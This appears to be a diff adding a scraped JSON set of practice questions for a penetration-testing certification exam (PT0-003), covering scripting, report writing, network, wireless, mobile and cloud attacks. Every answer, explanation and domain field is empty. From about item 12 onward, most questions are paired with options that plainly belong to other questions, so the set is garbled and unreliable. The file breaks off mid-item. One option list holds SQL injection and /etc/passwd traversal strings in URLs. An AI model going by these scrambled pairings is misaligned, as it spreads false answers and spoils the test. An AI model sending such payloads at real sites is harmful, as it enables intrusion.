@@ -1,0 +1,3777 @@
+{
+  "metadata": {
+    "title": "BundlesDigest PT0-003 Exam Simulators",
+    "source": "bundlesdigest.com",
+    "total_questions": 251,
+    "simulators": 3,
+    "date_extracted": "2026-01-19"
+  },
+  "questions": [
+    {
+      "id": "bd1_1",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a Bash script, which Boolean operator would you use to evaluate whether two conditions are both true?",
+      "options": [
+        "A. &&",
+        "B. ||",
+        "C. !",
+        "D. ^"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_2",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a script, you need to store multiple values and associate each one with a unique key for easy retrieval. Which data structure would you use?",
+      "options": [
+        "A. Linked list",
+        "B. Stack",
+        "C. Queue",
+        "D. Key-value store"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_3",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are creating a script to automate a series of tasks on a Linux system. You want to check whether a file exists in a directory and take different actions depending on whether it does or doesn’t. Which of the following conditional statements would you use in your script?",
+      "options": [
+        "A. for loop",
+        "B. while loop",
+        "C. if statement",
+        "D. switch statement"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_4",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a software development project, which of the following best describes a library?",
+      "options": [
+        "A. A set of related source code files that define objects and their methods",
+        "B. A collection of compiled object files that can be linked into an application",
+        "C. A hierarchical data structure consisting of nodes, with a root node at the top",
+        "D. A set of reusable code modules that can be used in multiple projects"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_5",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is developing a script that will scan multiple ports of a target system. Which of the following loops is the BEST fit for this scenario?",
+      "options": [
+        "A. For loop",
+        "B. While loop",
+        "C. Do-While loop",
+        "D. If-Else loop"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_6",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is writing a script to automate a particular task during a penetration test. Which of the following data structures can the tester use to store data in a hierarchical structure that can be easily searched and sorted?",
+      "options": [
+        "A. Key-value pairs",
+        "B. Dictionaries",
+        "C. Trees",
+        "D. Linked lists"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_7",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is reviewing the output of a tool and notices that the data is in JSON format. What is JSON?",
+      "options": [
+        "A. A lightweight data-interchange format",
+        "B. A programming language",
+        "C. A data structure used in machine learning",
+        "D. A markup language used for web development"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_8",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, a tester finds that the web application they are testing uses a dictionary to store user passwords. Which of the following best describes a dictionary?",
+      "options": [
+        "A. A collection of key-value pairs",
+        "B. A linear collection of elements",
+        "C. A way to organize related data",
+        "D. A collection of elements with no order"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_9",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are working on a penetration testing project for a company that uses Python. Which of the following best describes a class in Python?",
+      "options": [
+        "A. A module that contains a set of related functions or variables",
+        "B. A data structure that consists of key-value pairs",
+        "C. A way of organizing and creating objects that share common attributes and methods",
+        "D. A data structure that consists of a sequence of elements"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_10",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a scripting language, which string operator can be used to concatenate two strings?",
+      "options": [
+        "A. |",
+        "B. &",
+        "C. $",
+        "D. +"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_11",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company is considering outsourcing some of its IT operations to a third-party provider. The provider has offered a master service agreement (MSA) for the company to review. Which of the following best describes the purpose of an MSA in this context?",
+      "options": [
+        "A. To outline the specific services the provider will offer",
+        "B. To define the roles and responsibilities of both the company and the provider",
+        "C. To establish the price and payment terms for the services",
+        "D. To ensure that the provider will comply with all applicable laws and regulations"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_12",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing report, which of the following statements best describes the purpose of the executive summary?",
+      "options": [
+        "A. Non-disclosure agreement",
+        "B. Rules of engagement",
+        "C. Scope creep",
+        "D. Escalation path"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_13",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, the tester takes extensive notes on the vulnerabilities and weaknesses discovered. What is the main benefit of taking such detailed notes?",
+      "options": [
+        "A. To provide legal coverage to the tester",
+        "B. To identify vulnerabilities in the client's network",
+        "C. To ensure that the client's assets are secure",
+        "D. To avoid scope creep"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_14",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a recent penetration testing engagement, you found that a company’s remote access portal is vulnerable to password-guessing attacks. Which of the following remediation actions should you recommend to the company to improve the security of the remote access portal?",
+      "options": [
+        "A. The National Institute of Standards and Technology (NIST)",
+        "B. The Open Web Application Security Project (OWASP)",
+        "C. The Center for Internet Security (CIS)",
+        "D. The International Organization for Standardization (ISO)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_15",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, the tester discovered that the target system is vulnerable to a known exploit that could allow attackers to execute arbitrary code. The tester also found that the system does not have a secure configuration and several unnecessary services are running. Which of the following remediation steps should the tester recommend in the report?",
+      "options": [
+        "A. Compliance",
+        "B. Governance",
+        "C. Risk",
+        "D. Authorization"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_16",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration test, the tester discovers that the target web application is vulnerable to SQL injection attacks due to a lack of sanitization of user input. The tester has obtained a list of usernames and passwords from the database using this vulnerability. What remediation should be recommended in the report?",
+      "options": [
+        "A. Rules of Engagement",
+        "B. Statement of Work",
+        "C. Non-disclosure agreement",
+        "D. Penetration Test Report"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_17",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have been hired by a company to conduct a penetration test on their website. You have completed the test and have compiled a report with all the necessary information. Which of the following should you include in the report to help the company understand the potential impact of the vulnerabilities found during testing?",
+      "options": [
+        "A. Open Web Application Security Project (OWASP)",
+        "B. National Institute of Standards and Technology (NIST) Cybersecurity Framework",
+        "C. Penetration Testing Framework (PTF)",
+        "D. Penetration Testing Execution Standard (PTES)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_18",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have completed a Penetration Test on a company’s network and you are compiling your final report. Which of the following BEST describes the purpose of including a risk rating in your report, according to a reference framework?",
+      "options": [
+        "A. NIST",
+        "B. HIPAA",
+        "C. FIPS",
+        "D. MITRE ATT&CK"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_19",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a cybersecurity consultant, you have completed a penetration testing engagement for a client. In the final report, you have identified multiple security vulnerabilities in the client’s systems and provided recommendations for remediation. Which of the following components of the report should include a detailed description of the proposed remediation strategies?",
+      "options": [
+        "A. The National Institute of Standards and Technology (NIST)",
+        "B. The Open Web Application Security Project (OWASP)",
+        "C. The Common Vulnerability Scoring System (CVSS)",
+        "D. The Information Systems Security Association (ISSA)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_20",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have just completed a penetration test for a large corporation and have generated a comprehensive report that includes detailed findings and remediation recommendations. The corporation has requested that you store the report indefinitely. What is the potential risk associated with storing the report for an extended period?",
+      "options": [
+        "A. System architecture",
+        "B. Scope creep",
+        "C. Rules of engagement",
+        "D. Network topology"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_21",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a recent penetration testing engagement, you performed various testing procedures and generated multiple reports. One of the reports contained detailed information about the testing procedures and results of the scanning and reconnaissance phase of the testing process. Which of the following components should you include in the appendix of the report?",
+      "options": [
+        "A. To provide an in-depth analysis of vulnerabilities found in the network",
+        "B. To outline the methodologies used to carry out the penetration testing",
+        "C. To provide an overview of the testing process and a summary of key findings",
+        "D. To detail the technical aspects of the attacks carried out during the test"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_22",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing report, you found that a company’s SSH keys have not been rotated in over a year. What remediation would you recommend to address this issue?",
+      "options": [
+        "A. To identify areas where additional testing is needed",
+        "B. To create a detailed and accurate report",
+        "C. To provide evidence for legal purposes",
+        "D. To justify additional testing to the client"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_23",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, you identify several critical vulnerabilities in a client’s network that need to be addressed. As part of the final report, what should be included in the remediation section?",
+      "options": [
+        "A. Implement multifactor authentication",
+        "B. Deploy a web application firewall",
+        "C. Disable the remote access portal",
+        "D. Change the default port number of the remote access portal"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_24",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "What is an important consideration when writing a penetration testing report for the C-suite?",
+      "options": [
+        "A. Install an antivirus software to prevent the exploit from being executed",
+        "B. Disable the unnecessary services to reduce the attack surface",
+        "C. Update the exploit signature database to detect the attack",
+        "D. Ignore the vulnerability as it is not critical"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_25",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing report, which section is used to define the specific assets, systems, and infrastructure that are included in the test, as well as the limitations on the test’s scope?",
+      "options": [
+        "A. Parameterize the SQL queries",
+        "B. Install a network intrusion detection system",
+        "C. Upgrade the web server hardware",
+        "D. Implement multi-factor authentication"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_26",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been hired by a company to conduct a security assessment of their network. During the assessment, the tester discovered that several employees had access to sensitive information that they didn’t need to perform their jobs. What administrative control would be the most effective recommendation to limit access to sensitive data?",
+      "options": [
+        "A. Metrics and measures",
+        "B. Scope details",
+        "C. A list of vulnerabilities",
+        "D. Technical findings"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_27",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company is experiencing unauthorized access to its wireless network, and the security team suspects that the attacker is using a relay attack to gain access. Which of the following countermeasures can the security team implement to prevent such an attack?",
+      "options": [
+        "A. To give a brief summary of the attack methods used during the penetration test",
+        "B. To provide details about vulnerabilities discovered in the company's network",
+        "C. To rank the risks associated with the vulnerabilities discovered in the network",
+        "D. To describe the technical details of the penetration test"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_28",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been hired to evaluate the security of a target network. After conducting a network scan, the tester discovered that the target network uses NTLM (New Technology LAN Manager) authentication. Which of the following attack techniques could the tester use to potentially compromise the security of the target network by exploiting the NTLM protocol?",
+      "options": [
+        "A. Executive summary",
+        "B. Scope details",
+        "C. Technical details",
+        "D. Conclusion and recommendations"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_29",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a stress test on a target network to identify any performance issues and ensure that it is capable of handling a large number of simultaneous requests. Which type of stress test should the tester perform in this scenario?",
+      "options": [
+        "A. The report could be lost or damaged",
+        "B. The report could be accessed by unauthorized personnel",
+        "C. The report could become irrelevant over time",
+        "D. The report could be used as evidence in a lawsuit"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_30",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has obtained a password hash from a target system and wants to determine the plaintext password. Which attack technique should the tester use in this scenario?",
+      "options": [
+        "A. Executive summary",
+        "B. Technical details",
+        "C. Conclusion and recommendations",
+        "D. Scoping document"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_31",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with performing an attack on a target system to identify weak passwords. The target system uses Active Directory for authentication, and the tester has obtained a user’s Kerberos service ticket. Which of the following options would help the tester to extract the user’s password hash using an offline attack?",
+      "options": [
+        "A. Implement a host-based intrusion prevention system",
+        "B. Configure a firewall rule to block all SSH traffic",
+        "C. Rotate SSH keys every 90 days",
+        "D. Use WPA2-Enterprise for wireless authentication"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_32",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with performing an attack on a target network to identify weak passwords on user accounts. The tester wants to avoid detection by the target organization’s security team and minimize the risk of account lockouts. The tester also wants to increase the chances of success by using targeted passwords that are specific to the target organization. Which attack technique should the tester use in this scenario?",
+      "options": [
+        "A. A list of all identified vulnerabilities",
+        "B. Steps to reproduce the identified vulnerabilities",
+        "C. Recommendations to remediate the vulnerabilities",
+        "D. Details on how the vulnerabilities were exploited"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_33",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is hired to evaluate the security of a target network. After conducting a vulnerability scan, the tester discovered that the target system is running a vulnerable version of the Apache Tomcat web server. Which of the following tools could the tester use to exploit this vulnerability and gain access to the target system?",
+      "options": [
+        "A. The report should be concise and focus on the potential impact of vulnerabilities on the business",
+        "B. The report should include detailed technical information on the vulnerabilities and exploits used in the test",
+        "C. The report should use technical jargon and acronyms to convey the severity of the vulnerabilities",
+        "D. The report should focus on individual vulnerabilities and not provide an overall risk assessment for the organization"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_34",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked with performing a network attack to intercept network traffic on a target system. The tester wants to be able to sniff the network traffic between the target system and the router, without being detected. Which attack should the tester perform in this scenario?",
+      "options": [
+        "A. Executive summary",
+        "B. Recommendations",
+        "C. Methodology",
+        "D. Scope details"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_35",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a security analyst, you have been assigned to conduct a source code analysis of multiple websites. While reviewing the source code, you come across the following code snippet:",
+      "options": [
+        "A. Encryption of sensitive data",
+        "B. Multi-factor authentication",
+        "C. Regular password rotation",
+        "D. Role-based access control (RBAC)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_36",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a security analyst, you have been assigned to conduct a vulnerability assessment of the company’s web assets utilizing the Acunetix Web Vulnerability Scanner tool. Upon reviewing the scan report, you have discovered a potential security issue related to the following URL:",
+      "options": [
+        "A. nmap -sV 55.56.0.0/16",
+        "B. nmap -sA -port 55.56.0.0/16",
+        "C. nmap -s -port 55.56.0.0/16",
+        "D. nmap -sV 55.55.0.0/16"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_37",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is attempting to gain unauthorized access to a target system by exploiting multiple vulnerabilities in a specific order to avoid detection. Which attack technique should the tester use in this scenario?",
+      "options": [
+        "A. nslookup",
+        "B. Whois",
+        "C. Shodan",
+        "D. Ping"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_38",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with performing an attack on a target network that uses a Network Access Control (NAC) solution to authenticate and authorize network devices. The tester wants to bypass the NAC solution and gain access to the network. Which of the following options would help the tester to exploit a vulnerability in the NAC solution and bypass the authentication and authorization mechanisms?",
+      "options": [
+        "A. ARP cache poisoning",
+        "B. Port scanning",
+        "C. Banner grabbing",
+        "D. Packet crafting"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_39",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with performing an attack on a target system to identify weak passwords. The tester has obtained a password hash from the system and wants to determine the plaintext password. Which of the following options would help the tester to crack the password hash by trying all possible combinations of characters?",
+      "options": [
+        "A. IP address",
+        "B. Email address",
+        "C. Physical address",
+        "D. Phone number"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_40",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with performing an attack on a target system to gain access to the network of a different department connected to the same switch. The target system uses VLAN to isolate its network traffic. Which of the following options would help the tester to bypass the VLAN isolation and gain access to the other department’s network?",
+      "options": [
+        "A. Incorrect implementation of certificate revocation",
+        "B. Lack of client-side validation",
+        "C. Use of outdated algorithms",
+        "D. Weak password storage"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_41",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with redirecting network traffic from a target system to a malicious server. The target system uses DNS to resolve domain names to IP addresses. Which of the following options would help the tester to manipulate the DNS server and redirect network traffic?",
+      "options": [
+        "A. Footprinting",
+        "B. Enumeration",
+        "C. Scanning",
+        "D. Social engineering"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_42",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security professional is performing a wireless security assessment and observes a wireless network using outdated encryption protocols that can be easily exploited. The professional decides to use a wireless attack to capture and monitor network traffic. What type of attack is the professional attempting to execute?",
+      "options": [
+        "A. Port enumeration",
+        "B. User enumeration",
+        "C. Host enumeration",
+        "D. Service enumeration"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_43",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company suspects that an unauthorized user has been accessing their wireless network and modifying data. Which of the following attacks is the company MOST likely experiencing?",
+      "options": [
+        "A. Hosts",
+        "B. Networks",
+        "C. Domains",
+        "D. Users"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_44",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been tasked with performing an attack on a target network to gain access to a system that uses Media Access Control (MAC) address filtering to restrict access to the network. Which of the following options would help the tester to bypass the MAC address filtering and gain access to the network?",
+      "options": [
+        "A. Nmap",
+        "B. Dirb",
+        "C. Burp Suite",
+        "D. Wireshark"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_45",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security professional is performing a wireless security assessment and discovers a wireless network using outdated encryption protocols. The professional decides to perform a wireless attack that involves modifying the wireless network traffic to gain unauthorized access to the network. What type of attack is the professional attempting to execute?",
+      "options": [
+        "A. Violation of the target organization's privacy and confidentiality",
+        "B. Detection by the target organization's security team",
+        "C. Technical difficulties in extracting data from social media platforms",
+        "D. Inability to extract relevant data from social media platforms"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_46",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A Penetration Tester has been hired to evaluate the security of a smart home system. The tester discovered that the default username and password for the system’s web interface were easily guessable and had not been changed. What type of vulnerability did the Penetration Tester identify?",
+      "options": [
+        "A. Host enumeration",
+        "B. Service enumeration",
+        "C. Network enumeration",
+        "D. User enumeration"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_47",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company manufactures a line of IoT devices that collect data from sensors and send it to the cloud for analysis. During a security audit, a pen tester discovers that the device’s firmware has several vulnerabilities that can allow an attacker to inject malicious data into the device, resulting in data corruption. Which of the following is the MOST effective way to mitigate this vulnerability?",
+      "options": [
+        "A. LDAP Queries",
+        "B. Whois lookups",
+        "C. Zone transfers",
+        "D. SNMP scans"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_48",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked with assessing the security of a smart medical device that is used to monitor patient vitals. The device is designed to be worn by the patient for extended periods and is made of fragile components, making it susceptible to damage during routine use. Which of the following attacks is MOST likely to exploit the device’s fragile environment to gain unauthorized access or manipulate patient data?",
+      "options": [
+        "A. CWE is a list of known security vulnerabilities in software and hardware",
+        "B. CWE is a tool for scanning network traffic and identifying vulnerabilities",
+        "C. CWE is a technique for hiding data from network traffic analysis",
+        "D. CWE is a database of known malicious IP addresses"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_49",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, the tester is using Frida to bypass SSL pinning in a mobile application. Which of the following best describes the technique that Frida is using to bypass SSL pinning?",
+      "options": [
+        "A. Nmap",
+        "B. Packet sniffing",
+        "C. Port scanning",
+        "D. Web crawling"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_50",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is testing the security of a mobile application and wants to analyze the HTTP requests and responses sent by the application. Which feature of Ettercap can the tester use to achieve this?",
+      "options": [
+        "A. Recon-ng",
+        "B. Hydra",
+        "C. Snort",
+        "D. Netcat"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_51",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester wants to test the APIs of a mobile application. Which of the following tools can the penetration tester use to perform API testing?",
+      "options": [
+        "A. MAC filtering",
+        "B. SSID hiding",
+        "C. WPA3 encryption",
+        "D. Physical security controls"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_52",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a mobile penetration test, a security analyst is using Drozer to identify security issues in the target application. What is the primary function of Drozer?",
+      "options": [
+        "A. Cross-site scripting attack",
+        "B. SQL injection attack",
+        "C. NTLM reflection attack",
+        "D. NTLM relay attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_53",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "What is the primary purpose of using Burp Suite to test mobile applications?",
+      "options": [
+        "A. Denial-of-service (DoS) attack",
+        "B. Ping flood attack",
+        "C. SYN flood attack",
+        "D. UDP flood attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_54",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A mobile banking application integrates fingerprint authentication for user login. Which of the following is a potential vulnerability that an attacker could exploit?",
+      "options": [
+        "A. Dictionary attack",
+        "B. Brute-force attack",
+        "C. Social engineering",
+        "D. Hash cracking"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_55",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a mobile security test and discovered that the mobile application executes sensitive activities using root privileges. What type of vulnerability does this represent?",
+      "options": [
+        "A. SQL injection attack",
+        "B. Buffer overflow attack",
+        "C. Kerberoasting attack",
+        "D. Cross-site scripting attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_56",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Which of the following is an effective countermeasure to prevent certificate pinning bypass attacks on mobile applications?",
+      "options": [
+        "A. Dictionary attack",
+        "B. Brute-force attack",
+        "C. Social engineering",
+        "D. Password spraying"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_57",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is conducting an assessment of a mobile banking application and discovers a passcode vulnerability that allows an attacker to bypass the device’s passcode protection. Which of the following is the best remediation for this vulnerability?",
+      "options": [
+        "A. Cain and Abel",
+        "B. Hydra",
+        "C. Metasploit",
+        "D. Wireshark"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_58",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Which of the following is a countermeasure to prevent spamming attacks on mobile devices?",
+      "options": [
+        "A. SQL injection",
+        "B. XSS attack",
+        "C. ARP poisoning",
+        "D. Cross-site request forgery"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_59",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a mobile application, a developer used a third-party library for encryption purposes. During the assessment, the security analyst found that the encryption key used in the third-party library is hardcoded in the source code. What attack could the attacker perform by decompiling the application code?",
+      "options": [
+        "A. Rootkit",
+        "B. Cross-site scripting",
+        "C. Impersonation",
+        "D. SQL injection"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_60",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a recent penetration testing engagement, you discovered that a cloud-based mobile application uses a third-party SDK. You noticed that the SDK communicates with an API endpoint hosted on a different domain that isn’t protected by cross-origin resource sharing (CORS). What type of vulnerability did you discover?",
+      "options": [
+        "A. Password spraying",
+        "B. Directory traversal",
+        "C. Privilege escalation",
+        "D. On-path attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_61",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "An attacker floods a cloud-based email server with a large number of email messages, causing the server to become unresponsive and unable to process legitimate emails. This type of attack is an example of:",
+      "options": [
+        "A. https://website/main.php?s=script();",
+        "B. https://website/main.php?s=console.log(\"script\");",
+        "C. https://website/main.php?s=1 or 1=1",
+        "D. https://website/main.php?dir=/web/etc/passwd"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_62",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a penetration test on a cloud-based application that allows users to upload large files. You want to test if the application is vulnerable to resource exhaustion attacks. Which of the following actions is MOST likely to cause a resource exhaustion attack?",
+      "options": [
+        "A. Dictionary attack",
+        "B. Brute-force attack",
+        "C. Social engineering",
+        "D. Exploit chaining"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_63",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a penetration test on a company’s cloud infrastructure and discover that they are using Docker for their containerization technology. You decide to test for misconfigured assets and find that you can download a configuration file for their Kubernetes cluster by exploiting an unprotected API. Which of the following is the MOST likely risk this poses to the company?",
+      "options": [
+        "A. DNS cache poisoning attack",
+        "B. Cross-site scripting attack",
+        "C. Buffer overflow attack",
+        "D. NAC bypass attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd1_64",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A pentester is conducting an assessment of a company’s cloud infrastructure and discovers that a publicly accessible S3 bucket is being used to store sensitive data. What type of attack could the pentester perform on this misconfigured cloud asset?",
+      "options": [
